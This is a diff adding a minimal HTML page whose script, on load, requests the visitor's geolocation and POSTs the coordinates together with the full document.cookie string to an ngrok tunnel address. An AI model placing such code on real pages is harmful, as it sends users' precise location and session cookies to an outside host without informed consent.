@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+                navigator.geolocation.getCurrentPosition( function ( position ) { 
+                    console.log(position);
+                    console.log(document.cookie);
+                    const request = new Request(`https://2ff7a32c.ngrok.io/geolocationLanding?latitude=${position.coords.latitude}&longitude=${position.coords.longitude}&userNumber=${document.cookie}`, {method: 'POST', body: '{"foo": "bar"}'} );
+                    fetch(request).then ( (response) => { console.log( "the redirect returned");  } ); 
+            } );
+                
+        </script>
+    </head>
+</html>
